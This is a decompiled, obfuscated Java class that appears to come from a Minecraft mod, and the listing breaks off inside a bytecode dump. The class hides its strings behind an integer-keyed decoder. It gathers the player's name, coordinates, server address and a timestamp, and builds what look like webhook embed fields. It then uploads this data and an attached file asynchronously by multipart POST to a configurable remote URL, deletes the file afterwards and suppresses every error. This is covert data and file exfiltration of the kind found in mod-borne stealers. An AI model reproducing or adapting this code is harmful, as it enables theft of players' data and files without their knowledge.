// 
// Decompiled by Procyon v0.6.0
// 

package com.target.mod.compat.sub1.sub1.sub7;

import java.time.Duration;
import java.io.OutputStream;
import java.nio.file.Files;
import java.io.FileInputStream;
import java.nio.charset.StandardCharsets;
import java.net.URI;
import java.net.HttpURLConnection;
import java.util.concurrent.CompletableFuture;
import net.minecraft.class_310;
import com.target.mod.compat.sub1.sub1.sub1.Initializer_1;
import net.minecraft.class_2338;
import java.util.ArrayList;
import java.io.File;
import java.util.List;
import java.net.http.HttpClient;

public class Initializer_4
{
    private static final String strValue;
    private static final String strValue_1;
    private static final String strValue_2;
    private static final int intValue = 16711680;
    private static final HttpClient httpClient;
    private final String strValue_3;
    private final List<Initializer_12> list;
    private String strValue_4;
    private String strValue_5;
    private String strValue_6;
    private boolean boolFlag;
    private boolean boolFlag_1;
    private String strValue_7;
    private boolean boolFlag_2;
    private boolean boolFlag_3;
    private File file;
    private static final String[] strArr;
    private static final String[] strArr_1;
    
    public Initializer_4(final String strValue_3) {
        this.list = new ArrayList<Initializer_12>();
        this.strValue_4 = "";
        this.strValue_5 = "";
        this.strValue_6 = "";
        this.boolFlag = false;
        this.boolFlag_1 = false;
        this.strValue_7 = "";
        this.boolFlag_2 = false;
        this.boolFlag_3 = false;
        this.file = null;
        this.strValue_3 = strValue_3;
    }
    
    public Initializer_4 computeBuildj(final String strValue_4) {
        this.strValue_4 = strValue_4;
        return this;
    }
    
    public Initializer_4 computeBuildj_3(final String strValue_5) {
        this.strValue_5 = strValue_5;
        return this;
    }
    
    public Initializer_4 computeBuildj_4(final String strValue_6) {
        this.strValue_6 = strValue_6;
        return this;
    }
    
    public Initializer_4 getBuildj() {
        this.boolFlag = true;
        return this;
    }
    
    public Initializer_4 computeBuildj_1(final class_2338 class_2338) {
        this.boolFlag = true;
        if (class_2338 != null) {
            this.list.add(new Initializer_12(createString(-13830, 17329), String.format(createString(-13829, 9392), class_2338.method_10263(), class_2338.method_10264(), class_2338.method_10260()), true));
        }
        return this;
    }
    
    public Initializer_4 getBuildj_1() {
        this.boolFlag_1 = true;
        final class_310 class310 = Initializer_1.class310;
        if (class310 != null && class310.field_1724 != null) {
            this.strValue_7 = class310.field_1724.method_5477().getString();
        }
        return this;
    }
    
    public Initializer_4 computeBuildj_5(final String strValue_7) {
        this.boolFlag_1 = true;
        this.strValue_7 = strValue_7;
        return this;
    }
    
    public Initializer_4 createBuildj(final String s, final String s2, final boolean b) {
        this.list.add(new Initializer_12(s, s2, b));
        return this;
    }
    
    public Initializer_4 getBuildj_2() {
        this.boolFlag_2 = true;
        return this;
    }
    
    public Initializer_4 getBuildj_3() {
        this.boolFlag_3 = true;
        return this;
    }
    
    public Initializer_4 computeBuildj_2(final File file) {
        this.file = file;
        return this;
    }
    
    public void execute() {
        if (this.strValue_3 == null || this.strValue_3.trim().isEmpty()) {
            return;
        }
        CompletableFuture.runAsync(this::lambda$send$3);
    }
    
    private void setStringAndFile(final String s, final File file) {
        try {
            final String s2 = createString(-13835, -4468) + System.currentTimeMillis();
            final HttpURLConnection httpURLConnection = (HttpURLConnection)new URI(this.strValue_3).toURL().openConnection();
            httpURLConnection.setDoOutput(true);
            httpURLConnection.setRequestMethod(createString(-13847, 6667));
            httpURLConnection.setRequestProperty(createString(-13882, -32141), createString(-13833, -12517) + s2);
            httpURLConnection.setRequestProperty(createString(-13826, 8080), createString(-13876, -9595));
            httpURLConnection.setConnectTimeout(30000);
            httpURLConnection.setReadTimeout(30000);
            final OutputStream outputStream = httpURLConnection.getOutputStream();
            try {
                outputStream.write((createString(-13832, -8695) + s2 + createString(-13841, 15957)).getBytes(StandardCharsets.UTF_8));
                outputStream.write(createString(-13881, 26480).getBytes(StandardCharsets.UTF_8));
                outputStream.write(createString(-13851, 9622).getBytes(StandardCharsets.UTF_8));
                outputStream.write(s.getBytes(StandardCharsets.UTF_8));
                outputStream.write(createString(-13838, 12617).getBytes(StandardCharsets.UTF_8));
                outputStream.write((createString(-13844, -8467) + s2 + createString(-13838, 12617)).getBytes(StandardCharsets.UTF_8));
                outputStream.write(createString(-13837, 30263).getBytes(StandardCharsets.UTF_8));
                outputStream.write(createString(-13855, -5514).getBytes(StandardCharsets.UTF_8));
                try (final FileInputStream fileInputStream = new FileInputStream(file)) {
                    final byte[] array = new byte[4096];
                    while (true) {
                        final int read = fileInputStream.read(array);
                        try {
                            if (read != -1) {
                                outputStream.write(array, 0, read);
                                continue;
                            }
                        }
                        catch (final Throwable t) {
                            throw computeThrowable(t);
                        }
                        break;
                    }
                }
                outputStream.write(createString(-13838, 12617).getBytes(StandardCharsets.UTF_8));
                outputStream.write((createString(-13844, -8467) + s2 + createString(-13840, -17075)).getBytes(StandardCharsets.UTF_8));
                if (outputStream != null) {
                    outputStream.close();
                }
            }
            catch (final Throwable t3) {
                if (outputStream != null) {
                    try {
                        outputStream.close();
                    }
                    catch (final Throwable exception2) {
                        t3.addSuppressed(exception2);
                    }
                }
                throw t3;
            }
            final int responseCode = httpURLConnection.getResponseCode();
            try {
                if (responseCode != 204 && responseCode == 200) {}
            }
            catch (final Throwable t4) {
                throw computeThrowable(t4);
            }
            httpURLConnection.disconnect();
            Files.deleteIfExists(file.toPath());
        }
        catch (final Exception ex) {}
    }
    
    private String computeString(final String s) {
        if (s == null) {
            return "";
        }
        return s.replace("\\", createString(-13883, 9153)).replace("\"", createString(-13839, 18079)).replace("\n", createString(-13846, -12572)).replace("\r", createString(-13879, -1895)).replace("\t", createString(-13831, 6058));
    }
    
    private void lambda$send$3() {
        // 
        // This method could not be decompiled.
        // 
        // Original Bytecode:
        // 
        //     3: istore_1       
        //     4: getstatic       com/target/mod/compat/sub1/sub1/sub1/Initializer_1.class310:Lnet/minecraft/class_310;
        //     7: astore_2       
        //     8: ldc             ""
        //    10: astore_3       
        //    11: aload_0        
        //    12: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.strValue_6:Ljava/lang/String;
        //    15: invokevirtual   java/lang/String.trim:()Ljava/lang/String;
        //    18: invokevirtual   java/lang/String.isEmpty:()Z
        //    21: iload_1        
        //    22: ifeq            66
        //    25: ifne            62
        //    28: goto            35
        //    31: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //    34: athrow         
        //    35: sipush          -13880
        //    38: sipush          -22899
        //    41: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.createString:(II)Ljava/lang/String;
        //    44: iconst_1       
        //    45: anewarray       Ljava/lang/Object;
        //    48: dup            
        //    49: iconst_0       
        //    50: aload_0        
        //    51: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.strValue_6:Ljava/lang/String;
        //    54: invokevirtual   java/lang/String.trim:()Ljava/lang/String;
        //    57: aastore        
        //    58: invokestatic    java/lang/String.format:(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
        //    61: astore_3       
        //    62: aload_0        
        //    63: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.boolFlag:Z
        //    66: iload_1        
        //    67: ifeq            256
        //    70: ifeq            252
        //    73: goto            80
        //    76: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //    79: athrow         
        //    80: aload_2        
        //    81: iload_1        
        //    82: ifeq            103
        //    85: goto            92
        //    88: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //    91: athrow         
        //    92: ifnull          252
        //    95: goto            102
        //    98: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   101: athrow         
        //   102: aload_2        
        //   103: getfield        net/minecraft/class_310.field_1724:Lnet/minecraft/class_746;
        //   106: iload_1        
        //   107: ifeq            131
        //   110: ifnull          252
        //   113: goto            120
        //   116: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   119: athrow         
        //   120: aload_2        
        //   121: getfield        net/minecraft/class_310.field_1724:Lnet/minecraft/class_746;
        //   124: goto            131
        //   127: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   130: athrow         
        //   131: invokevirtual   net/minecraft/class_746.method_24515:()Lnet/minecraft/class_2338;
        //   134: astore          4
        //   136: aload_0        
        //   137: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.list:Ljava/util/List;
        //   140: invokeinterface java/util/List.stream:()Ljava/util/stream/Stream;
        //   145: invokedynamic   BootstrapMethod #3, test:()Ljava/util/function/Predicate;
        //   150: invokeinterface java/util/stream/Stream.noneMatch:(Ljava/util/function/Predicate;)Z
        //   155: iload_1        
        //   156: ifeq            256
        //   159: ifeq            252
        //   162: goto            169
        //   165: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   168: athrow         
        //   169: aload_0        
        //   170: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.list:Ljava/util/List;
        //   173: new             Lcom/target/mod/compat/sub1/sub1/sub7/Initializer_12;
        //   176: dup            
        //   177: sipush          -13828
        //   180: sipush          -10695
        //   183: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.createString:(II)Ljava/lang/String;
        //   186: sipush          -13850
        //   189: sipush          -31037
        //   192: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.createString:(II)Ljava/lang/String;
        //   195: iconst_3       
        //   196: anewarray       Ljava/lang/Object;
        //   199: dup            
        //   200: iconst_0       
        //   201: aload           4
        //   203: invokevirtual   net/minecraft/class_2338.method_10263:()I
        //   206: invokestatic    java/lang/Integer.valueOf:(I)Ljava/lang/Integer;
        //   209: aastore        
        //   210: dup            
        //   211: iconst_1       
        //   212: aload           4
        //   214: invokevirtual   net/minecraft/class_2338.method_10264:()I
        //   217: invokestatic    java/lang/Integer.valueOf:(I)Ljava/lang/Integer;
        //   220: aastore        
        //   221: dup            
        //   222: iconst_2       
        //   223: aload           4
        //   225: invokevirtual   net/minecraft/class_2338.method_10260:()I
        //   228: invokestatic    java/lang/Integer.valueOf:(I)Ljava/lang/Integer;
        //   231: aastore        
        //   232: invokestatic    java/lang/String.format:(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
        //   235: iconst_1       
        //   236: invokespecial   com/target/mod/compat/sub1/sub1/sub7/Initializer_12.<init>:(Ljava/lang/String;Ljava/lang/String;Z)V
        //   239: invokeinterface java/util/List.add:(Ljava/lang/Object;)Z
        //   244: pop            
        //   245: goto            252
        //   248: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   251: athrow         
        //   252: aload_0        
        //   253: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.boolFlag_1:Z
        //   256: iload_1        
        //   257: ifeq            354
        //   260: ifeq            350
        //   263: goto            270
        //   266: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   269: athrow         
        //   270: aload_0        
        //   271: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.strValue_7:Ljava/lang/String;
        //   274: invokevirtual   java/lang/String.isEmpty:()Z
        //   277: iload_1        
        //   278: ifeq            354
        //   281: goto            288
        //   284: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   287: athrow         
        //   288: ifeq            350
        //   291: goto            298
        //   294: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   297: athrow         
        //   298: aload_2        
        //   299: iload_1        
        //   300: ifeq            321
        //   303: goto            310
        //   306: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   309: athrow         
        //   310: ifnull          350
        //   313: goto            320
        //   316: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   319: athrow         
        //   320: aload_2        
        //   321: getfield        net/minecraft/class_310.field_1724:Lnet/minecraft/class_746;
        //   324: ifnull          350
        //   327: aload_0        
        //   328: aload_2        
        //   329: getfield        net/minecraft/class_310.field_1724:Lnet/minecraft/class_746;
        //   332: invokevirtual   net/minecraft/class_746.method_5477:()Lnet/minecraft/class_2561;
        //   335: invokeinterface net/minecraft/class_2561.getString:()Ljava/lang/String;
        //   340: putfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.strValue_7:Ljava/lang/String;
        //   343: goto            350
        //   346: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   349: athrow         
        //   350: aload_0        
        //   351: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.boolFlag_2:Z
        //   354: iload_1        
        //   355: ifeq            540
        //   358: ifeq            536
        //   361: goto            368
        //   364: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   367: athrow         
        //   368: aload_2        
        //   369: iload_1        
        //   370: ifeq            391
        //   373: goto            380
        //   376: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   379: athrow         
        //   380: ifnull          456
        //   383: goto            390
        //   386: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   389: athrow         
        //   390: aload_2        
        //   391: invokevirtual   net/minecraft/class_310.method_1562:()Lnet/minecraft/class_634;
        //   394: iload_1        
        //   395: ifeq            419
        //   398: ifnull          456
        //   401: goto            408
        //   404: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   407: athrow         
        //   408: aload_2        
        //   409: invokevirtual   net/minecraft/class_310.method_1562:()Lnet/minecraft/class_634;
        //   412: goto            419
        //   415: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   418: athrow         
        //   419: invokevirtual   net/minecraft/class_634.method_45734:()Lnet/minecraft/class_642;
        //   422: iload_1        
        //   423: ifeq            450
        //   426: ifnull          456
        //   429: goto            436
        //   432: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   435: athrow         
        //   436: aload_2        
        //   437: invokevirtual   net/minecraft/class_310.method_1562:()Lnet/minecraft/class_634;
        //   440: invokevirtual   net/minecraft/class_634.method_45734:()Lnet/minecraft/class_642;
        //   443: goto            450
        //   446: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   449: athrow         
        //   450: getfield        net/minecraft/class_642.field_3761:Ljava/lang/String;
        //   453: goto            465
        //   456: sipush          -13842
        //   459: sipush          8773
        //   462: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.createString:(II)Ljava/lang/String;
        //   465: astore          4
        //   467: aload_0        
        //   468: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.list:Ljava/util/List;
        //   471: invokeinterface java/util/List.stream:()Ljava/util/stream/Stream;
        //   476: invokedynamic   BootstrapMethod #4, test:()Ljava/util/function/Predicate;
        //   481: invokeinterface java/util/stream/Stream.noneMatch:(Ljava/util/function/Predicate;)Z
        //   486: iload_1        
        //   487: ifeq            540
        //   490: ifeq            536
        //   493: goto            500
        //   496: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   499: athrow         
        //   500: aload_0        
        //   501: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.list:Ljava/util/List;
        //   504: new             Lcom/target/mod/compat/sub1/sub1/sub7/Initializer_12;
        //   507: dup            
        //   508: sipush          -13886
        //   511: sipush          -12022
        //   514: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.createString:(II)Ljava/lang/String;
        //   517: aload           4
        //   519: iconst_1       
        //   520: invokespecial   com/target/mod/compat/sub1/sub1/sub7/Initializer_12.<init>:(Ljava/lang/String;Ljava/lang/String;Z)V
        //   523: invokeinterface java/util/List.add:(Ljava/lang/Object;)Z
        //   528: pop            
        //   529: goto            536
        //   532: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   535: athrow         
        //   536: aload_0        
        //   537: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.boolFlag_3:Z
        //   540: ifeq            646
        //   543: invokestatic    java/lang/System.currentTimeMillis:()J
        //   546: ldc2_w          1000
        //   549: ldiv           
        //   550: lstore          4
        //   552: aload_0        
        //   553: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.list:Ljava/util/List;
        //   556: invokeinterface java/util/List.stream:()Ljava/util/stream/Stream;
        //   561: invokedynamic   BootstrapMethod #5, test:()Ljava/util/function/Predicate;
        //   566: invokeinterface java/util/stream/Stream.noneMatch:(Ljava/util/function/Predicate;)Z
        //   571: iload_1        
        //   572: ifeq            645
        //   575: ifeq            646
        //   578: goto            585
        //   581: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   584: athrow         
        //   585: aload_0        
        //   586: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.list:Ljava/util/List;
        //   589: new             Lcom/target/mod/compat/sub1/sub1/sub7/Initializer_12;
        //   592: dup            
        //   593: sipush          -13825
        //   596: sipush          10914
        //   599: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.createString:(II)Ljava/lang/String;
        //   602: lload           4
        //   604: sipush          -13853
        //   607: sipush          -30882
        //   610: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.createString:(II)Ljava/lang/String;
        //   613: dup_x2         
        //   614: pop            
        //   615: sipush          -13834
        //   618: sipush          13381
        //   621: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.createString:(II)Ljava/lang/String;
        //   624: invokedynamic   BootstrapMethod #2, makeConcatWithConstants:(Ljava/lang/String;JLjava/lang/String;)Ljava/lang/String;
        //   629: iconst_1       
        //   630: invokespecial   com/target/mod/compat/sub1/sub1/sub7/Initializer_12.<init>:(Ljava/lang/String;Ljava/lang/String;Z)V
        //   633: invokeinterface java/util/List.add:(Ljava/lang/Object;)Z
        //   638: goto            645
        //   641: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   644: athrow         
        //   645: pop            
        //   646: new             Ljava/lang/StringBuilder;
        //   649: dup            
        //   650: invokespecial   java/lang/StringBuilder.<init>:()V
        //   653: astore          4
        //   655: aload_0        
        //   656: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.boolFlag_1:Z
        //   659: iload_1        
        //   660: ifeq            742
        //   663: ifeq            741
        //   666: goto            673
        //   669: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   672: athrow         
        //   673: aload_0        
        //   674: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.strValue_7:Ljava/lang/String;
        //   677: invokevirtual   java/lang/String.isEmpty:()Z
        //   680: iload_1        
        //   681: ifeq            742
        //   684: goto            691
        //   687: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   690: athrow         
        //   691: ifne            741
        //   694: goto            701
        //   697: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   700: athrow         
        //   701: aload           4
        //   703: sipush          -13877
        //   706: sipush          4113
        //   709: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.createString:(II)Ljava/lang/String;
        //   712: iconst_1       
        //   713: anewarray       Ljava/lang/Object;
        //   716: dup            
        //   717: iconst_0       
        //   718: aload_0        
        //   719: aload_0        
        //   720: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.strValue_7:Ljava/lang/String;
        //   723: invokevirtual   com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeString:(Ljava/lang/String;)Ljava/lang/String;
        //   726: aastore        
        //   727: invokestatic    java/lang/String.format:(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
        //   730: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   733: pop            
        //   734: goto            741
        //   737: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   740: athrow         
        //   741: iconst_0       
        //   742: istore          5
        //   744: iload           5
        //   746: aload_0        
        //   747: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.list:Ljava/util/List;
        //   750: invokeinterface java/util/List.size:()I
        //   755: if_icmpge       906
        //   758: iload_1        
        //   759: ifeq            1412
        //   762: iload           5
        //   764: iload_1        
        //   765: ifeq            807
        //   768: goto            775
        //   771: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   774: athrow         
        //   775: ifgt            810
        //   778: goto            785
        //   781: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   784: athrow         
        //   785: aload_0        
        //   786: iload_1        
        //   787: ifeq            837
        //   790: goto            797
        //   793: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   796: athrow         
        //   797: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.boolFlag_1:Z
        //   800: goto            807
        //   803: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   806: athrow         
        //   807: ifeq            826
        //   810: aload           4
        //   812: ldc_w           ","
        //   815: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   818: pop            
        //   819: goto            826
        //   822: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   825: athrow         
        //   826: aload_0        
        //   827: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.list:Ljava/util/List;
        //   830: iload           5
        //   832: invokeinterface java/util/List.get:(I)Ljava/lang/Object;
        //   837: checkcast       Lcom/target/mod/compat/sub1/sub1/sub7/Initializer_12;
        //   840: astore          6
        //   842: aload           4
        //   844: sipush          -13873
        //   847: sipush          -26968
        //   850: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.createString:(II)Ljava/lang/String;
        //   853: iconst_3       
        //   854: anewarray       Ljava/lang/Object;
        //   857: dup            
        //   858: iconst_0       
        //   859: aload_0        
        //   860: aload           6
        //   862: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_12.strValue:Ljava/lang/String;
        //   865: invokevirtual   com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeString:(Ljava/lang/String;)Ljava/lang/String;
        //   868: aastore        
        //   869: dup            
        //   870: iconst_1       
        //   871: aload_0        
        //   872: aload           6
        //   874: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_12.strValue_1:Ljava/lang/String;
        //   877: invokevirtual   com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeString:(Ljava/lang/String;)Ljava/lang/String;
        //   880: aastore        
        //   881: dup            
        //   882: iconst_2       
        //   883: aload           6
        //   885: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_12.boolFlag:Z
        //   888: invokestatic    java/lang/Boolean.valueOf:(Z)Ljava/lang/Boolean;
        //   891: aastore        
        //   892: invokestatic    java/lang/String.format:(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
        //   895: invokevirtual   java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   898: pop            
        //   899: iinc            5, 1
        //   902: iload_1        
        //   903: ifne            744
        //   906: ldc             ""
        //   908: astore          5
        //   910: aload_0        
        //   911: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.boolFlag_1:Z
        //   914: iload_1        
        //   915: ifeq            953
        //   918: ifeq            981
        //   921: goto            928
        //   924: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   927: athrow         
        //   928: aload_0        
        //   929: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.strValue_7:Ljava/lang/String;
        //   932: iload_1        
        //   933: ifeq            990
        //   936: goto            943
        //   939: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   942: athrow         
        //   943: invokevirtual   java/lang/String.isEmpty:()Z
        //   946: goto            953
        //   949: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //   952: athrow         
        //   953: ifne            981
        //   956: sipush          -13875
        //   959: sipush          10331
        //   962: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.createString:(II)Ljava/lang/String;
        //   965: iconst_1       
        //   966: anewarray       Ljava/lang/Object;
        //   969: dup            
        //   970: iconst_0       
        //   971: aload_0        
        //   972: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.strValue_7:Ljava/lang/String;
        //   975: aastore        
        //   976: invokestatic    java/lang/String.format:(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
        //   979: astore          5
        //   981: invokestatic    java/time/LocalDateTime.now:()Ljava/time/LocalDateTime;
        //   984: getstatic       java/time/format/DateTimeFormatter.ISO_LOCAL_DATE_TIME:Ljava/time/format/DateTimeFormatter;
        //   987: invokevirtual   java/time/LocalDateTime.format:(Ljava/time/format/DateTimeFormatter;)Ljava/lang/String;
        //   990: astore          6
        //   992: ldc             ""
        //   994: astore          7
        //   996: aload_0        
        //   997: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.file:Ljava/io/File;
        //  1000: iload_1        
        //  1001: ifeq            1025
        //  1004: ifnull          1042
        //  1007: goto            1014
        //  1010: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //  1013: athrow         
        //  1014: aload_0        
        //  1015: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.file:Ljava/io/File;
        //  1018: goto            1025
        //  1021: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeThrowable:(Ljava/lang/Throwable;)Ljava/lang/Throwable;
        //  1024: athrow         
        //  1025: invokevirtual   java/io/File.exists:()Z
        //  1028: ifeq            1042
        //  1031: sipush          -13885
        //  1034: sipush          -9771
        //  1037: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.createString:(II)Ljava/lang/String;
        //  1040: astore          7
        //  1042: sipush          -13827
        //  1045: sipush          -10795
        //  1048: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.createString:(II)Ljava/lang/String;
        //  1051: bipush          11
        //  1053: anewarray       Ljava/lang/Object;
        //  1056: dup            
        //  1057: iconst_0       
        //  1058: aload_0        
        //  1059: aload_3        
        //  1060: invokevirtual   com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeString:(Ljava/lang/String;)Ljava/lang/String;
        //  1063: aastore        
        //  1064: dup            
        //  1065: iconst_1       
        //  1066: aload_0        
        //  1067: sipush          -13874
        //  1070: sipush          4591
        //  1073: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.createString:(II)Ljava/lang/String;
        //  1076: invokevirtual   com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeString:(Ljava/lang/String;)Ljava/lang/String;
        //  1079: aastore        
        //  1080: dup            
        //  1081: iconst_2       
        //  1082: sipush          -13845
        //  1085: sipush          4708
        //  1088: invokestatic    com/target/mod/compat/sub1/sub1/sub7/Initializer_4.createString:(II)Ljava/lang/String;
        //  1091: aastore        
        //  1092: dup            
        //  1093: iconst_3       
        //  1094: aload_0        
        //  1095: aload_0        
        //  1096: getfield        com/target/mod/compat/sub1/sub1/sub7/Initializer_4.strValue_4:Ljava/lang/String;
        //  1099: invokevirtual   com/target/mod/compat/sub1/sub1/sub7/Initializer_4.computeString:(Ljava/lang/String;)Ljava/lang/String;
        //  1102: aastore        
        //  1103: dup            
        //  1104: iconst_4       
        //  1105: aload_0        
        //  1106: aload_0        
